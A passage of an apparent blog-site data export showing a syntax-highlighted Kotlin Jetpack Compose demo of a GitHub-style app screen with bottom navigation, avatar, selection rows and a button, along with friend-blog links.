punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token function\">Row</span><span class=\"token punctuation\">(</span>\n                    verticalAlignment <span class=\"token operator\">=</span> Alignment<span class=\"token punctuation\">.</span>CenterVertically\n                <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token function\">Surface</span><span class=\"token punctuation\">(</span>\n                        shape <span class=\"token operator\">=</span> CircleShape<span class=\"token punctuation\">,</span>\n                    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                        <span class=\"token function\">Image</span><span class=\"token punctuation\">(</span>\n                            painter <span class=\"token operator\">=</span> <span class=\"token function\">rememberImagePainter</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">data</span> <span class=\"token operator\">=</span> avatar<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                            contentDescription <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span>\n                            modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token number\">40</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                            contentScale <span class=\"token operator\">=</span> ContentScale<span class=\"token punctuation\">.</span>Crop\n                        <span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">}</span>\n                    <span class=\"token function\">Text</span><span class=\"token punctuation\">(</span>\n                        text <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n                        style <span class=\"token operator\">=</span> <span class=\"token function\">TextStyle</span><span class=\"token punctuation\">(</span>\n                            fontWeight <span class=\"token operator\">=</span> FontWeight<span class=\"token punctuation\">.</span>Bold<span class=\"token punctuation\">,</span>\n                            fontSize <span class=\"token operator\">=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">.</span>sp\n                        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                        modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">}</span>\n                <span class=\"token function\">Text</span><span class=\"token punctuation\">(</span>\n                    text <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n                    style <span class=\"token operator\">=</span> <span class=\"token function\">TextStyle</span><span class=\"token punctuation\">(</span>\n                        fontWeight <span class=\"token operator\">=</span> FontWeight<span class=\"token punctuation\">.</span>Bold<span class=\"token punctuation\">,</span>\n                        fontSize <span class=\"token operator\">=</span> <span class=\"token number\">16</span><span class=\"token punctuation\">.</span>sp\n                    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>top <span class=\"token operator\">=</span> <span class=\"token number\">30</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">,</span> bottom <span class=\"token operator\">=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">)</span>\n                <span class=\"token function\">WorkSelection</span><span class=\"token punctuation\">(</span>icon <span class=\"token operator\">=</span> R<span class=\"token punctuation\">.</span>drawable<span class=\"token punctuation\">.</span>ic_issue_opened<span class=\"token punctuation\">,</span> text <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">Color</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xFF25CA25</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token function\">WorkSelection</span><span class=\"token punctuation\">(</span>icon <span class=\"token operator\">=</span> R<span class=\"token punctuation\">.</span>drawable<span class=\"token punctuation\">.</span>ic_pull_request<span class=\"token punctuation\">,</span> text <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">Color</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xFF11ABF1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token function\">WorkSelection</span><span class=\"token punctuation\">(</span>icon <span class=\"token operator\">=</span> R<span class=\"token punctuation\">.</span>drawable<span class=\"token punctuation\">.</span>ic_git_repository_line<span class=\"token punctuation\">,</span> text <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">Color</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xFF8811F1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token function\">WorkSelection</span><span class=\"token punctuation\">(</span>icon <span class=\"token operator\">=</span> R<span class=\"token punctuation\">.</span>drawable<span class=\"token punctuation\">.</span>ic_organization<span class=\"token punctuation\">,</span> text <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">Color</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xFFF18C11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token function\">Divider</span><span class=\"token punctuation\">(</span>\n                    color <span class=\"token operator\">=</span> Color<span class=\"token punctuation\">.</span>Gray<span class=\"token punctuation\">,</span>\n                    modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>top <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">)</span>\n                    <span class=\"token function\">Column</span><span class=\"token punctuation\">(</span>\n                        Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>vertical <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                        <span class=\"token function\">Text</span><span class=\"token punctuation\">(</span>\n                            text <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n                            style <span class=\"token operator\">=</span> <span class=\"token function\">TextStyle</span><span class=\"token punctuation\">(</span>\n                                fontWeight <span class=\"token operator\">=</span> FontWeight<span class=\"token punctuation\">.</span>Bold<span class=\"token punctuation\">,</span>\n                                fontSize <span class=\"token operator\">=</span> <span class=\"token number\">16</span><span class=\"token punctuation\">.</span>sp\n                            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                            modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>bottom <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                        <span class=\"token punctuation\">)</span>\n                        <span class=\"token function\">Text</span><span class=\"token punctuation\">(</span>\n                            text <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n                            style <span class=\"token operator\">=</span> <span class=\"token function\">TextStyle</span><span class=\"token punctuation\">(</span>\n                                fontSize <span class=\"token operator\">=</span> <span class=\"token number\">16</span><span class=\"token punctuation\">.</span>sp\n                            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                            modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>top <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                        <span class=\"token punctuation\">)</span>\n                        <span class=\"token function\">Column</span><span class=\"token punctuation\">(</span>\n                            modifier <span class=\"token operator\">=</span> Modifier\n                                <span class=\"token punctuation\">.</span><span class=\"token function\">fillMaxWidth</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                                <span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>top <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                            horizontalAlignment <span class=\"token operator\">=</span> Alignment<span class=\"token punctuation\">.</span>CenterHorizontally\n                        <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                            <span class=\"token function\">Card</span><span class=\"token punctuation\">(</span>\n                                modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>horizontal <span class=\"token operator\">=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                                shape <span class=\"token operator\">=</span> <span class=\"token function\">RoundedCornerShape</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span>\n                            <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                                <span class=\"token function\">Button</span><span class=\"token punctuation\">(</span>\n                                    onClick <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">/*TODO*/</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                                    elevation <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span>\n                                    modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">fillMaxWidth</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                                    shape <span class=\"token operator\">=</span> <span class=\"token function\">RoundedCornerShape</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                                    colors <span class=\"token operator\">=</span> ButtonDefaults<span class=\"token punctuation\">.</span><span class=\"token function\">buttonColors</span><span class=\"token punctuation\">(</span>\n                                        backgroundColor <span class=\"token operator\">=</span> Color<span class=\"token punctuation\">.</span>Transparent\n                                    <span class=\"token punctuation\">)</span>\n                                <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                                    <span class=\"token function\">Text</span><span class=\"token punctuation\">(</span>\n                                        text <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n                                        style <span class=\"token operator\">=</span> <span class=\"token function\">TextStyle</span><span class=\"token punctuation\">(</span>\n                                            fontSize <span class=\"token operator\">=</span> <span class=\"token number\">14</span><span class=\"token punctuation\">.</span>sp<span class=\"token punctuation\">,</span>\n                                            color <span class=\"token operator\">=</span> <span class=\"token function\">Color</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xFF229DD5</span><span class=\"token punctuation\">)</span>\n                                        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                                        modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                                    <span class=\"token punctuation\">)</span>\n                                <span class=\"token punctuation\">}</span>\n                            <span class=\"token punctuation\">}</span>\n                        <span class=\"token punctuation\">}</span>\n                    <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token annotation builtin\">@Composable</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">WorkSelection</span><span class=\"token punctuation\">(</span>\n        icon<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span>\n        text<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n        color<span class=\"token operator\">:</span> Color\n    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">Row</span><span class=\"token punctuation\">(</span>\n            Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>vertical <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            verticalAlignment <span class=\"token operator\">=</span> Alignment<span class=\"token punctuation\">.</span>CenterVertically\n        <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token comment\">// icon</span>\n            <span class=\"token function\">Surface</span><span class=\"token punctuation\">(</span>\n                shape <span class=\"token operator\">=</span> <span class=\"token function\">RoundedCornerShape</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>end <span class=\"token operator\">=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token function\">Image</span><span class=\"token punctuation\">(</span>\n                    painter <span class=\"token operator\">=</span> <span class=\"token function\">painterResource</span><span class=\"token punctuation\">(</span>id <span class=\"token operator\">=</span> icon<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    contentDescription <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span>\n                    modifier <span class=\"token operator\">=</span> Modifier\n                        <span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token number\">30</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                        <span class=\"token punctuation\">.</span><span class=\"token function\">background</span><span class=\"token punctuation\">(</span>color<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    colorFilter <span class=\"token operator\">=</span> ColorFilter<span class=\"token punctuation\">.</span><span class=\"token function\">tint</span><span class=\"token punctuation\">(</span>Color<span class=\"token punctuation\">.</span>White<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token function\">Text</span><span class=\"token punctuation\">(</span>\n                text <span class=\"token operator\">=</span> text<span class=\"token punctuation\">,</span>\n                style <span class=\"token operator\">=</span> <span class=\"token function\">TextStyle</span><span class=\"token punctuation\">(</span>\n                    fontSize <span class=\"token operator\">=</span> <span class=\"token number\">15</span><span class=\"token punctuation\">.</span>sp\n                <span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token annotation builtin\">@Preview</span>\n    <span class=\"token annotation builtin\">@Composable</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">Preview</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">Main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>Compose</p>\n<p><img src=\"https://gitee.com/coldrain-moro/images_bed/raw/master/images/Screenshot_2021-12-24-22-32-59-446_kim.bifrost.co.jpg\"></p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<h1 id=\"Jetpack-Compose\"><a href=\"#Jetpack-Compose\" class=\"headerlink\" title=\"Jetpack Compose\"></a>Jetpack Compose</h1><p>WanAndroid<em><strong>Jetpack Compose</strong></em>Github App</p>\n<p>DSLUIMinecraftUIAndroidxmlUIAndroiduiUIJetpack ComposeDSLJetpack UI</p>\n<p>WanAndroidAndroid StudioComposeComposedemo</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> MainActivity <span class=\"token operator\">:</span> <span class=\"token function\">ComponentActivity</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">onCreate</span><span class=\"token punctuation\">(</span>savedInstanceState<span class=\"token operator\">:</span> Bundle<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">onCreate</span><span class=\"token punctuation\">(</span>savedInstanceState<span class=\"token punctuation\">)</span>\n        setContent <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">ComposeTestTheme</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token function\">Main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation builtin\">@Composable</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">Main</span><span class=\"token punctuation\">(</span>\n        avatar<span class=\"token operator\">:</span> String <span class=\"token operator\">=</span> <span class=\"token string\">\"https://gitee.com/coldrain-moro/images_bed/raw/master/images/chino.jpg\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">var</span> selectedItem <span class=\"token keyword\">by</span> remember <span class=\"token punctuation\">&#123;</span> <span class=\"token function\">mutableStateOf</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">val</span> items <span class=\"token operator\">=</span> <span class=\"token function\">listOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token function\">Scaffold</span><span class=\"token punctuation\">(</span>\n            bottomBar <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token function\">BottomNavigation</span><span class=\"token punctuation\">(</span>\n                    backgroundColor <span class=\"token operator\">=</span> Color<span class=\"token punctuation\">.</span>White<span class=\"token punctuation\">,</span>\n                    modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">height</span><span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                    items<span class=\"token punctuation\">.</span><span class=\"token function\">forEachIndexed</span> <span class=\"token punctuation\">&#123;</span> index<span class=\"token punctuation\">,</span> item <span class=\"token operator\">-></span>\n                        <span class=\"token function\">BottomNavigationItem</span><span class=\"token punctuation\">(</span>\n                            icon <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n                                <span class=\"token keyword\">when</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n                                    <span class=\"token number\">0</span> <span class=\"token operator\">-></span> <span class=\"token function\">Icon</span><span class=\"token punctuation\">(</span>Icons<span class=\"token punctuation\">.</span>Filled<span class=\"token punctuation\">.</span>Home<span class=\"token punctuation\">,</span> contentDescription <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span>\n                                    <span class=\"token number\">1</span> <span class=\"token operator\">-></span> <span class=\"token function\">Icon</span><span class=\"token punctuation\">(</span>Icons<span class=\"token punctuation\">.</span>Filled<span class=\"token punctuation\">.</span>Notifications<span class=\"token punctuation\">,</span> contentDescription <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span>\n                                    <span class=\"token keyword\">else</span> <span class=\"token operator\">-></span> <span class=\"token function\">Icon</span><span class=\"token punctuation\">(</span>Icons<span class=\"token punctuation\">.</span>Filled<span class=\"token punctuation\">.</span>Search<span class=\"token punctuation\">,</span> contentDescription <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span>\n                                <span class=\"token punctuation\">&#125;</span>\n                            <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n                            label <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token function\">Text</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n                            selected <span class=\"token operator\">=</span> selectedItem <span class=\"token operator\">==</span> index<span class=\"token punctuation\">,</span>\n                            onClick <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> selectedItem <span class=\"token operator\">=</span> index <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">&#125;</span>\n                <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">Column</span><span class=\"token punctuation\">(</span>\n                Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token function\">Row</span><span class=\"token punctuation\">(</span>\n                    verticalAlignment <span class=\"token operator\">=</span> Alignment<span class=\"token punctuation\">.</span>CenterVertically\n                <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                    <span class=\"token function\">Surface</span><span class=\"token punctuation\">(</span>\n                        shape <span class=\"token operator\">=</span> CircleShape<span class=\"token punctuation\">,</span>\n                    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                        <span class=\"token function\">Image</span><span class=\"token punctuation\">(</span>\n                            painter <span class=\"token operator\">=</span> <span class=\"token function\">rememberImagePainter</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">data</span> <span class=\"token operator\">=</span> avatar<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                            contentDescription <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span>\n                            modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token number\">40</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                            contentScale <span class=\"token operator\">=</span> ContentScale<span class=\"token punctuation\">.</span>Crop\n                        <span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">&#125;</span>\n                    <span class=\"token function\">Text</span><span class=\"token punctuation\">(</span>\n                        text <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n                        style <span class=\"token operator\">=</span> <span class=\"token function\">TextStyle</span><span class=\"token punctuation\">(</span>\n                            fontWeight <span class=\"token operator\">=</span> FontWeight<span class=\"token punctuation\">.</span>Bold<span class=\"token punctuation\">,</span>\n                            fontSize <span class=\"token operator\">=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">.</span>sp\n                        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                        modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">&#125;</span>\n                <span class=\"token function\">Text</span><span class=\"token punctuation\">(</span>\n                    text <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n                    style <span class=\"token operator\">=</span> <span class=\"token function\">TextStyle</span><span class=\"token punctuation\">(</span>\n                        fontWeight <span class=\"token operator\">=</span> FontWeight<span class=\"token punctuation\">.</span>Bold<span class=\"token punctuation\">,</span>\n                        fontSize <span class=\"token operator\">=</span> <span class=\"token number\">16</span><span class=\"token punctuation\">.</span>sp\n                    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>top <span class=\"token operator\">=</span> <span class=\"token number\">30</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">,</span> bottom <span class=\"token operator\">=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">)</span>\n                <span class=\"token function\">WorkSelection</span><span class=\"token punctuation\">(</span>icon <span class=\"token operator\">=</span> R<span class=\"token punctuation\">.</span>drawable<span class=\"token punctuation\">.</span>ic_issue_opened<span class=\"token punctuation\">,</span> text <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">Color</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xFF25CA25</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token function\">WorkSelection</span><span class=\"token punctuation\">(</span>icon <span class=\"token operator\">=</span> R<span class=\"token punctuation\">.</span>drawable<span class=\"token punctuation\">.</span>ic_pull_request<span class=\"token punctuation\">,</span> text <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">Color</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xFF11ABF1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token function\">WorkSelection</span><span class=\"token punctuation\">(</span>icon <span class=\"token operator\">=</span> R<span class=\"token punctuation\">.</span>drawable<span class=\"token punctuation\">.</span>ic_git_repository_line<span class=\"token punctuation\">,</span> text <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">Color</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xFF8811F1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token function\">WorkSelection</span><span class=\"token punctuation\">(</span>icon <span class=\"token operator\">=</span> R<span class=\"token punctuation\">.</span>drawable<span class=\"token punctuation\">.</span>ic_organization<span class=\"token punctuation\">,</span> text <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">Color</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xFFF18C11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token function\">Divider</span><span class=\"token punctuation\">(</span>\n                    color <span class=\"token operator\">=</span> Color<span class=\"token punctuation\">.</span>Gray<span class=\"token punctuation\">,</span>\n                    modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>top <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">)</span>\n                    <span class=\"token function\">Column</span><span class=\"token punctuation\">(</span>\n                        Modifier<span class=\"token punctuation\">.</span><span 